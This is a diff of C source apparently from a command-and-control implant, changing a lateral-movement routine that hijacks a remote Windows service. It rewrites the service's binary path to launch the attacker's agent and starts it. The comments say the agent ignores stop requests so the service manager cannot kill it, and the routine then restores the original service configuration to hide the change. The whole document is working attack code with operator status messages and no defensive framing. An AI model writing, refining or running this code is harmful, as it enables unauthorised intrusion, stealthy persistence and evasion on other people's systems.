@@ -1231,23 +1231,24 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
     snprintf(msg, sizeof(msg), "[+] Hijacking service '%ls' on %ls\n", svcName, target);
     buf_append(out, msg, (DWORD)strlen(msg));
 
-    /* 5. Change binPath to our payload — keep original service type (SERVICE_NO_CHANGE).
-     * Changing to SERVICE_WIN32_OWN_PROCESS makes SCM on Server 2025 strictly enforce
-     * service lifecycle and kill processes that misbehave. Keeping the original type
-     * (usually SHARE_PROCESS) means SCM is more lenient after timeout. */
+    /* 5. Change binPath AND type to OWN_PROCESS so the agent's
+     * StartServiceCtrlDispatcherW succeeds (SHARE_PROCESS requires
+     * matching service name which we can't know at compile time).
+     * The agent's _svc_ctrl_handler ignores STOP so SCM can't
+     * kill us cooperatively — we stay alive indefinitely. */
     wchar_t newBinPath[512];
     swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs.exe", rname);
-    pChangeCfg(hSvc, SERVICE_NO_CHANGE, SERVICE_DEMAND_START,
+    pChangeCfg(hSvc, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE, newBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
 
-    /* 6. Start service — SCM launches our binary as a new process.
-     * The agent doesn't register as a service, so SCM will timeout with error 1053
-     * (ERROR_SERVICE_REQUEST_TIMEOUT). This is expected — the process keeps running. */
+    /* 6. Start service — SCM launches our binary.  The agent registers
+     * via StartServiceCtrlDispatcherW and reports SERVICE_RUNNING with
+     * dwControlsAccepted=0, so StartServiceW returns quickly (success). */
     BOOL startOk = pStartSvc(hSvc, 0, NULL);
     DWORD startErr = GetLastError();
 
-    /* Error 1053 = service didn't respond in time = EXPECTED (agent never calls
-     * StartServiceCtrlDispatcher). The process was launched and is running. */
+    /* Error 1053 = timeout (shouldn't happen now that agent registers,
+     * but accept it as success just in case). */
     if (!startOk && startErr != 1053) {
         snprintf(msg, sizeof(msg), "[-] StartService failed (err=%lu)\n", startErr);
         buf_append(out, msg, (DWORD)strlen(msg));
@@ -1260,10 +1261,10 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
         return FALSE;
     }
 
-    /* 7. Restore original binPath immediately (matches Adaptix scshell).
-     * SERVICE_NO_CHANGE for type = don't touch it. Binary stays on disk —
-     * the agent process has it locked so DeleteFileW would fail anyway. */
-    pChangeCfg(hSvc, SERVICE_NO_CHANGE, SERVICE_DEMAND_START,
+    /* 7. Restore original config (type + start type + binPath).
+     * The agent process is already running and registered with SCM —
+     * restoring the config doesn't affect it. */
+    pChangeCfg(hSvc, origSvcType, origStartType,
                SERVICE_ERROR_IGNORE, origBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
 
     pCloseSH(hSvc);
